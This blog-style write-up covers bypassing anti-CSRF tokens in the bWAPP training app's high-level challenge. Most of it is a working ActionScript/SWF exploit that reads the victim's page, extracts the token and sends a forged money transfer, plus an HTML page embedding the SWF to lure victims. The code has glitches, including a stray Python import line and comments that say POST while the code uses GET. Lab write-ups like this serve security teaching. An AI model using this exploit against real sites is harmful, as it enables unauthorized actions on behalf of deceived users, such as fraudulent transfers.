---
title: Bypass Cross Site Request Forgery Protection
tags: ["Web Attack", "SWF", "Exploit", "Hack", "Web Exploit"]
date: 2017-12-01
cover: "/media/csrf-Bypass.gif"
---

## Attack

Cross Site Request Forgery (CSRF) is an attack where a malicious entity tricks a victim into performing actions on behalf of the attacker. The impact of the attack would depend on the level of authorization that the victim who is being exploited is having into the system.
The most popular implementation to prevent Cross-site Request Forgery (CSRF), is to make use of a nonce that is associated with a particular user and it's current view model of the web page. This token is called a anti-CSRF Token or a Synchronizer Token.
In bWapp (BeeBox) CSRF level high challenge, the attacker need to bypass this token in order to complete this challenge.  


## Script

```ActiveX
// csrfBypass.as

import socket,ssl

// BypassCSRFtransferMoney bWaPP
// Author: Vishal_alt
// BwApp Level:High CSRF challenge

package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class csrfBypass extends Sprite {
  public function csrfBypass() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "http://mybuggy.app/bWAPP/csrf_2.php";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }


  private function eventHandler(event:Event):void {
   // This assigns the reponse from the first 
   // request to "reponse". The antiCSRF token is
   // somwhere in this reponse
   var response:String = event.target.data;

   // This line looks for the line in the response 
   //that contains the CSRF token
   var CSRF:Array = response.match(/token.*/);

   // This line extracts the value of the CSRF token, 
   // and assigns it to "token"
   var token:String = CSRF[0].split("\"")[4];

   // These next two lines create the prefix and the 
   // suffix for the POST request
   var prefix:String = "token="
   var suffix:String = "&account=123-45678-90&amount=900&action=transfer"

   // This section sets up a new URLRequest object and
   // sets the method to post   
   var sendTo:String = "http://mybuggy.app/bWAPP/csrf_2.php?"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.GET;

   // This next line sets the data portion of the GET
   // request to the "prefix" + "token" + "suffix"
   sendRequest.data = prefix.concat(token,suffix)
   
   // Time to create the URLLoader object and send the 
   // POST request containing the CSRF token
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   	   } 
   catch (error:Error) {
    trace("Error loading URL: " + error);
   	  }
    }
  }
}

```

Using the above active script we can generate a SWF flash file. This flash file can easily help in bypassing the CSRF protection because the target site crossdomain.xml allows all with *  ;-) . SWF flash file will send a background request once accessed by the victim, through his (victim) web browser (Yes you need to lure victim, call Mr. Robot if you need help :D) to the target domain and will fetch the anti-CSRF token via first request. Onces the token is fetched it will send another request to perform an authorized action in behalf of the victim user which in this case is money transfer.

Now all we need to do is create a malicious HTML page and embedd this SWF in it and entice victim to just open it in order to our mount the bypass attack.


```HTML
<!--This is byPassCSRF.html-->

<html>

<object width="1" height="1">
    <param name="movie" value="csrfBypass.swf">
    <embed src="csrfBypass.swf" width="100" height="100">
    </embed>
</object>

</html>


```




## Exploit


![ XSRF Protection Bypass](/media/csrf-Bypass.gif "Flash Exploit in Action!!")





##### **References**:

1. [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
2. [bWapp](https://sourceforge.net/projects/bwapp/)

